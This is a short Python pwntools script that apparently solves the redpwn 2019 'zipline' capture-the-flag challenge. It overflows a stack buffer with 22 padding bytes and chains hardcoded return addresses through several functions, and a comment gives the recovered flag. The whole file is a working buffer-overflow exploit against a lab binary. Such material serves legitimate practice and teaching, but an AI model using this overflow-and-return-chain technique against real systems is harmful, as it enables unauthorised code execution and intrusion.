from pwn import *


def exploit():
#	p = remote("chall.2019.redpwn.net", 4005)
	p = process("./zipline")
	p = process("./zipline")
	
	air         = 0x08049216
	water       = 0x0804926d
	land        = 0x080492c4
	underground = 0x0804931b
	limbo       = 0x08049372
	hell        = 0x080493c9
	minecraft   = 0x08049420
	bedrock     = 0x08049477

	i_got_u_main= 0x08049569

	payload  = 'A'*22
	payload += p32(air)
	payload += p32(water)
	payload += p32(land)
	payload += p32(underground)
	payload += p32(limbo)
	payload += p32(hell)
	payload += p32(minecraft)
	payload += p32(bedrock)
	payload += p32(i_got_u_main)

	p.sendline(payload)
	print p.recvall()
	
	p.close()
#flag{h0w_l0w_c4n_u_g0_br0}


exploit()
